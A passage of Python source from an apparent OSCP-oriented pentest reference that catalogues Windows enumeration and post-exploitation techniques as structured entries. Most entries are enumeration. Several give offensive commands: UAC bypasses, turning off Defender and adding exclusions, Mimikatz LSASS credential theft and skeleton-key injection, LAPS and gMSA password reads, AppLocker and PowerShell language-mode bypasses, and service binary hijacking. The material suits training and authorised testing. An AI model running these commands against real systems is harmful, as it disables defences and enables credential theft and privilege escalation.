                            '2. elevate svc-exe <LISTENER> - Service-based elevation (writes to disk)',
                            '3. runasadmin uac-token-duplication <COMMAND> - Run single command elevated',
                            '4. runasadmin uac-cmstplua <COMMAND> - CMSTPLUA COM interface bypass',
                            '5. Note: Only works if UAC not at highest level',
                            '6. Check Beacon integrity: shell whoami /groups | findstr Level'
                        ],
                        'success_indicators': [
                            'New high integrity Beacon spawns',
                            'Command executes with admin rights',
                            'No UAC prompt to user'
                        ],
                        'failure_indicators': [
                            'UAC at highest level (Always notify)',
                            'Not in Administrators group',
                            'Method detected by AV/EDR'
                        ],
                        'alternatives': [
                            'Manual: fodhelper.exe registry hijack',
                            'UACME: 70+ methods for different versions',
                            'GUI bypass: If RDP access, just click "Yes"'
                        ],
                        'tags': ['OSCP:HIGH', 'UAC_BYPASS', 'C2'],
                        'notes': 'Cobalt Strike UAC bypass modules convenient but often signatured. Consider custom implementation.'
                    }
                },
                {
                    'id': f'uac-check-integrity-{target}',
                    'name': 'Check Current Integrity Level',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /groups | findstr "Mandatory Label"',
                        'description': 'Check current process integrity level (Low, Medium, High, System)',
                        'flag_explanations': {
                            'whoami /groups': 'Show all group memberships and labels',
                            'findstr "Mandatory Label"': 'Filter for integrity level',
                            'Low': 'Sandboxed (IE, Edge)',
                            'Medium': 'Standard user',
                            'High': 'Elevated admin',
                            'System': 'SYSTEM account'
                        },
                        'success_indicators': [
                            'Integrity level displayed',
                            'Medium = Need UAC bypass if admin group',
                            'High = Already elevated, no bypass needed',
                            'System = Highest privilege'
                        ],
                        'failure_indicators': [
                            'Command fails (old Windows version)',
                            'No Mandatory Label shown'
                        ],
                        'next_steps': [
                            'If Medium + admin group: Use UAC bypass',
                            'If High: Already elevated, proceed with admin tasks',
                            'If Low: Escape sandbox first (difficult)',
                            'Check admin group: net localgroup administrators'
                        ],
                        'alternatives': [
                            'PowerShell: ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")',
                            'Process Hacker: Check process integrity in GUI'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'notes': 'Integrity levels: Low < Medium < High < System. UAC bypass elevates Medium → High (admin group required).'
                    }
                }
            ]
        }

    def _get_authentication_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """Authentication & Credentials (15+ techniques)"""
        return {
            'id': f'authentication-creds-{target}',
            'name': 'Authentication & Credentials',
            'type': 'parent',
            'children': [
                {
                    'id': f'applocker-check-{target}',
                    'name': 'Check AppLocker Policy',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections',
                        'description': 'Check AppLocker policy (application whitelisting)',
                        'flag_explanations': {
                            'Get-AppLockerPolicy': 'Query AppLocker policy',
                            '-Effective': 'Show effective policy (local + GPO)',
                            'RuleCollections': 'Exe, Script, Msi, Dll, Appx rules'
                        },
                        'success_indicators': [
                            'AppLocker policy displayed',
                            'Blocked paths revealed (e.g., %System32%\\WindowsPowerShell\\v1.0\\powershell.exe)',
                            'Allowed paths found (writable locations)'
                        ],
                        'failure_indicators': [
                            'AppLocker not configured (no policy)',
                            'Access denied (rare)',
                            'Command not available (older Windows)'
                        ],
                        'next_steps': [
                            'Find writable allowed paths: C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys, C:\\Windows\\Tasks, C:\\Windows\\Temp',
                            'Bypass: Copy payload to allowed writable path',
                            'DLL bypass: AppLocker rarely enforces DLL rules (performance)',
                            'Use trusted binaries (LOLBAS): rundll32, regsvr32, mshta, msiexec'
                        ],
                        'alternatives': [
                            'Registry: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2',
                            'Manual: Copy payload to allowed path and execute'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'BYPASS'],
                        'notes': 'AppLocker writable bypasses: C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys, C:\\Windows\\Tasks. DLL enforcement rare.'
                    }
                },
                {
                    'id': f'credential-storage-locations-{target}',
                    'name': 'Credential Storage Locations',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Overview of Windows credential storage locations',
                        'manual_steps': [
                            '1. SAM (Security Accounts Manager): Local user passwords (hashed), located at C:\\Windows\\System32\\config\\SAM',
                            '2. LSASS (Local Security Authority Subsystem): In-memory credentials (Kerberos tickets, NTLM hashes, plaintext passwords), process: lsass.exe',
                            '3. LSA Secrets: Stored credentials (service accounts, scheduled tasks), registry: HKLM\\SECURITY\\Policy\\Secrets',
                            '4. NTDS.dit: Active Directory database (Domain Controller only), located at C:\\Windows\\NTDS\\NTDS.dit',
                            '5. Credential Manager: Saved credentials (web, RDP, SMB), vault: C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials',
                            '6. DPAPI: Encrypted data (SecureStrings, saved passwords), master keys: C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Protect',
                            '7. Registry: Autologon passwords, VNC passwords, PuTTY sessions'
                        ],
                        'success_indicators': [
                            'Understanding credential storage locations',
                            'Target LSASS for in-memory credentials',
                            'SAM/SYSTEM dump for offline cracking',
                            'NTDS.dit dump for domain-wide credentials'
                        ],
                        'alternatives': [
                            'Mimikatz: sekurlsa::logonpasswords (LSASS)',
                            'Procdump + Mimikatz: Dump LSASS remotely',
                            'Impacket: secretsdump.py for SAM/LSA/NTDS'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'ENUM'],
                        'notes': 'LSASS = gold mine (tickets, hashes, plaintext). SAM = offline cracking. NTDS.dit = domain-wide access.'
                    }
                },
                {
                    'id': f'defender-status-check-{target}',
                    'name': 'Check Windows Defender Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-MpComputerStatus | select RealTimeProtectionEnabled,AntivirusEnabled,AntispywareEnabled',
                        'description': 'Check Windows Defender status and configuration',
                        'flag_explanations': {
                            'Get-MpComputerStatus': 'Get Defender status',
                            'RealTimeProtectionEnabled': 'Real-time scanning active',
                            'AntivirusEnabled': 'Antivirus component active',
                            'AntispywareEnabled': 'Antispyware component active'
                        },
                        'success_indicators': [
                            'Defender status retrieved',
                            'RealTimeProtectionEnabled = False (disabled)',
                            'Can determine AV evasion needs'
                        ],
                        'failure_indicators': [
                            'Access denied (rare)',
                            'Defender not installed (Windows 7 or earlier)',
                            'Third-party AV installed (Defender disabled)'
                        ],
                        'next_steps': [
                            'If enabled: Use AV bypass techniques',
                            'Check exclusions: Get-MpPreference | select Exclusion*',
                            'Disable (admin): Set-MpPreference -DisableRealtimeMonitoring $true',
                            'Add exclusion: Add-MpPreference -ExclusionPath "C:\\Temp"'
                        ],
                        'alternatives': [
                            'WMI: wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct',
                            'Service: sc query windefend',
                            'Manual: Check system tray for Defender icon'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'notes': 'Defender = most common AV on Windows 10/11. Check before uploading payloads.'
                    }
                },
                {
                    'id': f'efs-decryption-{target}',
                    'name': 'EFS (Encrypting File System) Decryption',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Decrypt EFS-encrypted files (requires user context or SYSTEM)',
                        'manual_steps': [
                            '1. Identify EFS files: cipher /u /n (list encrypted files)',
                            '2. Check EFS certificate: cipher /c <FILE> (shows who can decrypt)',
                            '3. Method 1 - User context: Impersonate user token (meterpreter: migrate to user process)',
                            '4. Method 2 - User password: Run as user (runas /user:DOMAIN\\user cmd)',
                            '5. Method 3 - SYSTEM + user logged in: Impersonate user from SYSTEM',
                            '6. Decrypt: Files automatically decrypt when copied to non-EFS volume (FAT32)',
                            '7. Or: Copy over SMB (auto-decrypts during transmission)'
                        ],
                        'success_indicators': [
                            'EFS files identified',
                            'User context obtained',
                            'Files decrypt automatically when accessed'
                        ],
                        'failure_indicators': [
                            'User not logged in (can\'t impersonate)',
                            'Don\'t have user password',
                            'DPAPI master keys not accessible'
                        ],
                        'alternatives': [
                            'Mimikatz: dpapi::masterkey → crypto::system /file:<EFS_FILE>',
                            'Copy to FAT32: copy <FILE> D:\\ (if D: is FAT32)',
                            'SMB copy: copy \\\\localhost\\C$\\... → auto-decrypt'
                        ],
                        'tags': ['OSCP:MEDIUM', 'CREDENTIALS', 'DECRYPT'],
                        'notes': 'EFS = transparent encryption for file owner. Auto-decrypts on FAT32 copy or SMB transfer. Rare in OSCP.'
                    }
                },
                {
                    'id': f'gmsa-password-read-{target}',
                    'name': 'Read gMSA (Group Managed Service Account) Password',
                    'type': 'command',
                    'metadata': {
                        'command': 'GMSAPasswordReader.exe --AccountName <ACCOUNT_NAME>',
                        'description': 'Read gMSA password from LDAP (if authorized)',
                        'flag_explanations': {
                            'GMSAPasswordReader': 'Tool to read gMSA passwords from AD',
                            '--AccountName': 'gMSA account name (ends with $)',
                            'LDAP property': 'msDS-ManagedPassword (240-char auto-rotated password)'
                        },
                        'success_indicators': [
                            'gMSA password retrieved (NTLM hash)',
                            'Can use for authentication (Pass-the-Hash)',
                            'Password auto-rotates every 30 days (re-read if expired)'
                        ],
                        'failure_indicators': [
                            'Access denied (not authorized to read)',
                            'gMSA account not found',
                            'LDAPS required (secure channel)'
                        ],
                        'next_steps': [
                            'Use gMSA password: Pass-the-Hash or create ticket',
                            'Check gMSA permissions: Get-ADServiceAccount <ACCOUNT> -Properties PrincipalsAllowedToRetrieveManagedPassword',
                            'Lateral movement: Use gMSA to access services (SQL, IIS, scheduled tasks)'
                        ],
                        'alternatives': [
                            'PowerShell: (Get-ADServiceAccount <ACCOUNT> -Properties msDS-ManagedPassword)."msDS-ManagedPassword"',
                            'LDAP relay: Relay authentication to read gMSA (https://cube0x0.github.io/Relaying-for-gMSA/)',
                            'Manual LDAP query: ldapsearch -H ldaps://dc -b "..." "(samAccountName=gmsa$)"'
                        ],
                        'tags': ['OSCP:MEDIUM', 'CREDENTIALS', 'AD'],
                        'notes': 'Tool: https://github.com/rvazarkar/GMSAPasswordReader. gMSA = service accounts with auto-rotation. More: https://cube0x0.github.io/Relaying-for-gMSA/'
                    }
                },
                {
                    'id': f'laps-password-read-{target}',
                    'name': 'Read LAPS (Local Admin Password Solution) Password',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-ADComputer <COMPUTER_NAME> -Properties ms-Mcs-AdmPwd | select name,ms-Mcs-AdmPwd',
                        'description': 'Read local admin password stored in AD by LAPS',
                        'flag_explanations': {
                            'Get-ADComputer': 'Query computer object in AD',
                            'ms-Mcs-AdmPwd': 'LAPS password attribute (plaintext)',
                            'ms-Mcs-AdmPwdExpirationTime': 'Password expiration timestamp'
                        },
                        'success_indicators': [
                            'LAPS password retrieved (plaintext)',
                            'Can use for local admin access (RDP, WinRM, SMB)',
                            'Password rotates automatically (check expiration)'
                        ],
                        'failure_indicators': [
                            'Access denied (not authorized to read LAPS)',
                            'LAPS not deployed (attribute empty)',
                            'Computer not found in AD'
                        ],
                        'next_steps': [
                            'Use LAPS password: evil-winrm -i <COMPUTER> -u Administrator -p <LAPS_PASSWORD>',
                            'Check LAPS permissions: Find-AdmPwdExtendedRights',
                            'Enumerate LAPS deployment: Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | where {$_.ms-Mcs-AdmPwdExpirationTime -ne $null}'
                        ],
                        'alternatives': [
                            'PowerView: Get-DomainComputer <COMPUTER> -Properties ms-Mcs-AdmPwd',
                            'LAPSToolkit: Get-LAPSComputers',
                            'Manual LDAP: ldapsearch ... "(samAccountName=<COMPUTER>$)" ms-Mcs-AdmPwd'
                        ],
                        'tags': ['OSCP:HIGH', 'CREDENTIALS', 'AD', 'LATERAL'],
                        'notes': 'LAPS = local admin passwords in AD. Plaintext. Rotates automatically. Check ACL for read permissions.'
                    }
                },
                {
                    'id': f'constrained-language-mode-bypass-{target}',
                    'name': 'PowerShell Constrained Language Mode Bypass',
                    'type': 'command',
                    'metadata': {
                        'command': 'powershell -version 2',
                        'description': 'Bypass PowerShell Constrained Language Mode using PowerShell v2',
                        'flag_explanations': {
                            '-version 2': 'Run PowerShell version 2 (no CLM, no AMSI)',
                            'Constrained Language Mode': 'Restricts PowerShell features (Add-Type, COM objects, .NET types)',
                            'Check mode': '$ExecutionContext.SessionState.LanguageMode'
                        },
                        'success_indicators': [
                            'PowerShell v2 session opens',
                            'LanguageMode = FullLanguage (unrestricted)',
                            'Can use all PowerShell features'
                        ],
                        'failure_indicators': [
                            'PowerShell v2 not installed (Windows 10+ often removed)',
                            'CLM still enforced (AppLocker blocks v2)',
                            'Error: PowerShell v2 requires .NET 2.0/3.5'
                        ],
                        'next_steps': [
                            'If v2 not available: Use PSByPassCLM (https://github.com/padovah4ck/PSByPassCLM)',
                            'PSByPassCLM: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U psby.exe',
                            'Alternative: ReflectivePick, SharpPick (execute PS in any process)'
                        ],
                        'alternatives': [
                            'PSByPassCLM: InstallUtil.exe /U bypass.exe',
                            'PowerShell runspaces: Create unrestricted runspace from C#',
                            'C# PowerShell API: System.Management.Automation.PowerShell.Create()'
                        ],
                        'tags': ['OSCP:MEDIUM', 'BYPASS', 'POWERSHELL'],
                        'notes': 'PSv2 = no CLM, no AMSI. Often removed on Win10+. PSByPassCLM uses InstallUtil.exe (LOLBAS). More: https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode'
                    }
                },
                {
                    'id': f'sspi-authentication-overview-{target}',
                    'name': 'SSPI & SSP Overview',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Security Support Provider Interface (SSPI) and SSPs',
                        'manual_steps': [
                            '1. SSPI = Windows authentication API (negotiates protocols between client/server)',
                            '2. SSPs (Security Support Providers) = DLLs implementing auth protocols:',
                            '   - Kerberos: Preferred (mutual authentication), %windir%\\System32\\kerberos.dll',
                            '   - NTLM (v1/v2): Compatibility (challenge-response), %windir%\\System32\\msv1_0.dll',
                            '   - Digest: Web/LDAP (MD5 hash), %windir%\\System32\\wdigest.dll',
                            '   - Schannel: SSL/TLS, %windir%\\System32\\schannel.dll',
                            '   - Negotiate: Auto-select protocol (Kerberos > NTLM), %windir%\\System32\\lsasrv.dll',
                            '3. SSP DLLs loaded into LSASS process',
                            '4. Attack: Inject malicious SSP DLL to steal credentials (Mimikatz: misc::memssp)'
                        ],
                        'success_indicators': [
                            'Understanding Windows authentication flow',
                            'Kerberos = preferred (tickets)',
                            'NTLM = fallback (hashes)',
                            'SSP DLL injection = credential theft'
                        ],
                        'alternatives': [
                            'Mimikatz: misc::memssp (inject SSP to steal plaintext)',
                            'Skeleton Key: Inject backdoor into LSASS (Mimikatz: misc::skeleton)',
                            'Hook CredSSP: Steal RDP credentials'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AUTHENTICATION', 'THEORY'],
                        'notes': 'SSPI = authentication framework. Kerberos > NTLM. SSP injection = persistence + credential theft.'
                    }
                }
            ]
        }

    def _get_cmd_techniques(self, target: str, context: str) -> Dict[str, Any]:
        """Windows CMD for Pentesters (40+ techniques)"""
        return {
            'id': f'cmd-pentesting-{target}',
            'name': 'Windows CMD for Pentesters',
            'type': 'parent',
            'children': [
                # System Information
                {
                    'id': f'cmd-system-info-{target}',
                    'name': 'System Information',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'systeminfo-{target}',
                            'name': 'System Info (systeminfo)',
                            'type': 'command',
                            'metadata': {
                                'command': 'systeminfo',
                                'description': 'Display detailed system configuration and OS information',
                                'flag_explanations': {
                                    'systeminfo': 'Shows OS name, version, patches, architecture, domain info'
                                },
                                'success_indicators': [
                                    'OS Name and Version displayed',
                                    'Hotfix/Patch information visible',
                                    'Domain information (if joined)'
                                ],
                                'failure_indicators': [
                                    'Access denied (limited permissions)',
                                    'Command not found (old Windows)'
                                ],
                                'next_steps': [
                                    'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" (filter output)',
                                    'wmic qfe get Caption,Description,HotFixID,InstalledOn (list patches)',
                                    'Check for missing patches via exploit-suggester'
                                ],
                                'alternatives': [
                                    'wmic computersystem LIST full',
                                    'Get-ComputerInfo (PowerShell)',
                                    'Manual: Check C:\\Windows\\System32\\config\\SAM'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN', 'MANUAL']
                            }
                        },
                        {
                            'id': f'wmic-patches-{target}',
                            'name': 'List Installed Patches (wmic)',
                            'type': 'command',
                            'metadata': {
                                'command': 'wmic qfe get Caption,Description,HotFixID,InstalledOn',
                                'description': 'List all installed Windows updates/patches (Quick Fix Engineering)',
                                'flag_explanations': {
                                    'wmic': 'Windows Management Instrumentation Command-line',
                                    'qfe': 'Query Quick Fix Engineering (patches)',
                                    'get Caption,Description,HotFixID,InstalledOn': 'Select specific columns'
                                },
                                'success_indicators': [
                                    'List of installed KBs (Knowledge Base articles)',
                                    'Installation dates visible'
                                ],
                                'alternatives': [
                                    'wmic qfe list brief',
                                    'Get-HotFix (PowerShell)',
                                    'Manual: Check Windows Update history'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'environment-vars-{target}',
                            'name': 'Environment Variables (set)',
                            'type': 'command',
                            'metadata': {
                                'command': 'set',
                                'description': 'Display all environment variables (useful paths, domain info)',
                                'flag_explanations': {
                                    'set': 'Display or set environment variables'
                                },
                                'notes': '''
Key Environment Variables:
- COMPUTERNAME: Hostname
- USERNAME: Current user
- USERDOMAIN: Domain name
- LOGONSERVER: Domain controller name
- TEMP/TMP: Temp directory (writable location)
- PATH: Executable search paths
- APPDATA: Application data folder

Extract Domain Controller:
nslookup %LOGONSERVER%.%USERDNSDOMAIN%
''',
                                'alternatives': [
                                    'echo %USERNAME%',
                                    'echo %COMPUTERNAME%',
                                    '$env:COMPUTERNAME (PowerShell)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'mounted-disks-{target}',
                            'name': 'List Mounted Disks',
                            'type': 'command',
                            'metadata': {
                                'command': 'wmic logicaldisk get caption,description,providername',
                                'description': 'List all mounted drives and network shares',
                                'flag_explanations': {
                                    'wmic logicaldisk': 'Query logical disk information',
                                    'get caption,description,providername': 'Show drive letter, type, and network path'
                                },
                                'alternatives': [
                                    'fsutil fsinfo drives',
                                    'wmic logicaldisk get caption',
                                    'Get-PSDrive (PowerShell)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        }
                    ]
                },

                # Users & Groups
                {
                    'id': f'cmd-users-groups-{target}',
                    'name': 'Users & Groups Enumeration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'whoami-all-{target}',
                            'name': 'Current User Info (whoami /all)',
                            'type': 'command',
                            'metadata': {
                                'command': 'whoami /all',
                                'description': 'Display complete info about current user (SID, privileges, groups)',
                                'flag_explanations': {
                                    'whoami': 'Display current username',
                                    '/all': 'Show SID, privileges, and group memberships'
                                },
                                'success_indicators': [
                                    'User SID displayed',
                                    'Enabled privileges listed (SeImpersonatePrivilege = SYSTEM!)',
                                    'Group memberships shown'
                                ],
                                'next_steps': [
                                    'Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (Potato attacks)',
                                    'whoami /priv (show only privileges)',
                                    'whoami /groups (show only groups)'
                                ],
                                'alternatives': [
                                    'whoami /priv',
                                    'whoami /groups',
                                    'Manual: net user %USERNAME%'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN', 'MANUAL']
                            }
                        },
                        {
                            'id': f'net-users-local-{target}',
                            'name': 'List Local Users (net users)',
                            'type': 'command',
                            'metadata': {
                                'command': 'net users',
                                'description': 'List all local user accounts',
                                'flag_explanations': {
                                    'net users': 'Display local users',
                                    'net user <username>': 'Show detailed user info',
                                    'net user /domain': 'List domain users'
                                },
                                'success_indicators': [
                                    'List of local accounts',
                                    'Administrator account visible'
                                ],
                                'next_steps': [
                                    'net user Administrator (check admin account)',
                                    'net localgroup Administrators (list admin group members)',
                                    'Look for service accounts or unusual usernames'
                                ],
                                'alternatives': [
                                    'wmic USERACCOUNT Get Domain,Name,Sid',
                                    'Get-LocalUser (PowerShell)',
                                    'dir /b /ad C:\\Users'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'net-localgroup-{target}',
                            'name': 'List Local Groups',
                            'type': 'command',
                            'metadata': {
                                'command': 'net localgroup',
                                'description': 'List all local security groups',
                                'flag_explanations': {
                                    'net localgroup': 'Display all local groups',
                                    'net localgroup Administrators': 'List members of Administrators group'
                                },
                                'success_indicators': [
                                    'List of local groups',
                                    'Administrators group visible'
                                ],
                                'next_steps': [
                                    'net localgroup Administrators',
                                    'net localgroup "Remote Desktop Users"',
                                    'Check who has admin/RDP access'
                                ],
                                'alternatives': [
                                    'wmic group list /format:list',
                                    'Get-LocalGroup (PowerShell)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'domain-users-{target}',
                            'name': 'Domain Users (net user /domain)',
                            'type': 'command',
                            'metadata': {
                                'command': 'net user /domain',
                                'description': 'List all users in the domain',
                                'flag_explanations': {
                                    'net user /domain': 'Query domain for all user accounts',
                                    'net user <username> /domain': 'Get detailed user info from domain'
                                },
                                'success_indicators': [
                                    'Domain user list displayed',
                                    'No access denied error'
                                ],
                                'failure_indicators': [
                                    'The request will be processed at a domain controller (not in domain)',
                                    'System error 1355 (not connected to domain)'
                                ],
                                'alternatives': [
                                    'dsquery user',
                                    'wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_user GET ds_samaccountname',
                                    'Get-ADUser -Filter * (PowerShell AD module)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'AD']
                            }
                        },
                        {
                            'id': f'domain-groups-{target}',
                            'name': 'Domain Groups (net group /domain)',
                            'type': 'command',
                            'metadata': {
                                'command': 'net group /domain',
                                'description': 'List all domain security groups',
                                'flag_explanations': {
                                    'net group /domain': 'Query domain groups',
                                    'net group "Domain Admins" /domain': 'List domain admin members'
                                },
                                'success_indicators': [
                                    'Domain groups listed',
                                    'Domain Admins, Enterprise Admins groups visible'
                                ],
                                'next_steps': [
                                    'net group "Domain Admins" /domain',
                                    'net group "Domain Controllers" /domain',
                                    'Identify high-value targets'
                                ],
                                'alternatives': [
                                    'dsquery group',
                                    'wmic /NAMESPACE:\\\\root\\directory\\ldap PATH ds_group GET ds_samaccountname'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'AD']
                            }
                        }
                    ]
                },

                # Processes & Services
                {
                    'id': f'cmd-processes-services-{target}',
                    'name': 'Processes & Services',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'tasklist-{target}',
                            'name': 'List Processes (tasklist)',
                            'type': 'command',
                            'metadata': {
                                'command': 'tasklist /V',
                                'description': 'List all running processes with detailed info',
                                'flag_explanations': {
                                    'tasklist': 'Display running processes',
                                    '/V': 'Verbose (show window titles, session info)',
                                    '/SVC': 'Show services hosted in each process'
                                },
                                'success_indicators': [
                                    'Process list with PIDs',
                                    'Username column (who is running each process)'
                                ],
                                'next_steps': [
                                    'tasklist /SVC (link processes to services)',
                                    'taskkill /PID <pid> /F (kill process)',
                                    'Look for unusual processes or privil eged services'
                                ],
                                'alternatives': [
                                    'wmic process list brief',
                                    'Get-Process (PowerShell)',
                                    'ps (PowerShell alias)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'net-start-{target}',
                            'name': 'List Running Services (net start)',
                            'type': 'command',
                            'metadata': {
                                'command': 'net start',
                                'description': 'List all started Windows services',
                                'flag_explanations': {
                                    'net start': 'Show running services',
                                    'sc query': 'More detailed service info',
                                    'wmic service list brief': 'Full service enumeration'
                                },
                                'success_indicators': [
                                    'List of running services',
                                    'Service display names visible'
                                ],
                                'alternatives': [
                                    'sc query',
                                    'wmic service list brief',
                                    'Get-Service (PowerShell)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'sc-query-{target}',
                            'name': 'Service Details (sc query)',
                            'type': 'command',
                            'metadata': {
                                'command': 'sc query',
                                'description': 'Query service status and configuration',
                                'flag_explanations': {
                                    'sc query': 'Query all services',
                                    'sc qc <service>': 'Query service configuration (shows binary path)',
                                    'sc config <service> binpath= "cmd.exe"': 'Modify service binary path (requires admin)'
                                },
                                'notes': '''
Privilege Escalation:
1. sc qc <service> (check binary path and START_TYPE)
2. If writable binary path or weak service permissions:
3. sc config <service> binpath= "C:\\temp\\malicious.exe"
4. sc start <service> or net start <service>
''',
                                'alternatives': [
                                    'wmic service where name="<service>" get PathName,StartMode',
                                    'Get-Service | Select Name,Status,StartType'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'PRIVESC']
                            }
                        },
                        {
                            'id': f'schtasks-{target}',
                            'name': 'Scheduled Tasks (schtasks)',
                            'type': 'command',
                            'metadata': {
                                'command': 'schtasks /query /fo LIST /v',
                                'description': 'List all scheduled tasks (privilege escalation vector)',
                                'flag_explanations': {
                                    'schtasks': 'Scheduled task management',
                                    '/query': 'Query scheduled tasks',
                                    '/fo LIST': 'Format output as list',
                                    '/v': 'Verbose (show full details)'
                                },
                                'success_indicators': [
                                    'Scheduled tasks listed',
                                    'Task To Run paths visible'
                                ],
                                'next_steps': [
                                    'schtasks /query /fo LIST /v | findstr "SYSTEM"',
                                    'Look for writable task paths running as SYSTEM',
                                    'Replace binary to escalate privileges'
                                ],
                                'alternatives': [
                                    'Get-ScheduledTask (PowerShell)',
                                    'Manual: Check C:\\Windows\\System32\\Tasks\\'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'PRIVESC']
                            }
                        }
                    ]
                },

                # Network Enumeration
                {
                    'id': f'cmd-network-{target}',
                    'name': 'Network Enumeration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'ipconfig-all-{target}',
                            'name': 'Network Config (ipconfig /all)',
                            'type': 'command',
                            'metadata': {
                                'command': 'ipconfig /all',
                                'description': 'Display full network adapter configuration',
                                'flag_explanations': {
                                    'ipconfig': 'Display IP configuration',
                                    '/all': 'Show full details (DNS, DHCP, MAC addresses)'
                                },
                                'success_indicators': [
                                    'IP addresses listed',
                                    'DNS servers visible',
                                    'Gateway and subnet info'
                                ],
                                'next_steps': [
                                    'ipconfig /displaydns (show DNS cache)',
                                    'Identify internal network ranges',
                                    'Check for multiple NICs (pivot opportunities)'
                                ],
                                'alternatives': [
                                    'Get-NetIPConfiguration (PowerShell)',
                                    'wmic nicconfig get IPAddress,DefaultIPGateway'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN', 'NETWORK']
                            }
                        },
                        {
                            'id': f'route-print-{target}',
                            'name': 'Routing Table (route print)',
                            'type': 'command',
                            'metadata': {
                                'command': 'route print',
                                'description': 'Display IP routing table (identify network segments)',
                                'flag_explanations': {
                                    'route print': 'Show routing table',
                                    'route add': 'Add static route (for pivoting)'
                                },
                                'success_indicators': [
                                    'Routing table displayed',
                                    'Network destinations and gateways visible'
                                ],
                                'alternatives': [
                                    'Get-NetRoute (PowerShell)',
                                    'netstat -r'
                                ],
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'NETWORK']
                            }
                        },
                        {
                            'id': f'arp-a-{target}',
                            'name': 'ARP Table (arp -a)',
                            'type': 'command',
                            'metadata': {
                                'command': 'arp -a',
                                'description': 'Display ARP cache (recently communicated hosts)',
                                'flag_explanations': {
                                    'arp': 'Address Resolution Protocol',
                                    '-a': 'Display current ARP entries'
                                },
                                'success_indicators': [
                                    'ARP entries listed',
                                    'IP to MAC address mappings visible'
                                ],
                                'notes': 'Reveals other hosts on the local network (lateral movement targets)',
                                'alternatives': [
                                    'Get-NetNeighbor (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'NETWORK']
                            }
                        },
                        {
                            'id': f'netstat-ano-{target}',
                            'name': 'Open Ports & Connections (netstat -ano)',
                            'type': 'command',
                            'metadata': {
                                'command': 'netstat -ano',
                                'description': 'Display all open ports and active connections with PIDs',
                                'flag_explanations': {
                                    'netstat': 'Network statistics',
                                    '-a': 'All connections and listening ports',
                                    '-n': 'Numerical addresses (no DNS lookup)',
                                    '-o': 'Show process ID (PID)'
                                },
                                'success_indicators': [
                                    'Listening ports displayed',
                                    'Established connections visible',
                                    'PIDs associated with each connection'
                                ],
                                'next_steps': [
                                    'netstat -ano | findstr LISTENING',
                                    'Identify internal services (MySQL, MSSQL, RDP)',
                                    'tasklist /FI "PID eq <PID>" (find process name)'
                                ],
                                'alternatives': [
                                    'Get-NetTCPConnection (PowerShell)',
                                    'ss -tulpn (Linux equivalent)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN', 'NETWORK']
                            }
                        },
                        {
                            'id': f'dns-cache-{target}',
                            'name': 'DNS Cache (ipconfig /displaydns)',
                            'type': 'command',
                            'metadata': {
                                'command': 'ipconfig /displaydns | findstr "Record" | findstr "Name Host"',
                                'description': 'Display DNS resolver cache (recently resolved hostnames)',
                                'flag_explanations': {
                                    'ipconfig /displaydns': 'Show DNS cache',
                                    'ipconfig /flushdns': 'Clear DNS cache'
                                },
                                'success_indicators': [
                                    'DNS records listed',
                                    'Internal hostnames visible'
                                ],
                                'notes': 'Reveals internal infrastructure (domain controllers, file servers)',
                                'alternatives': [
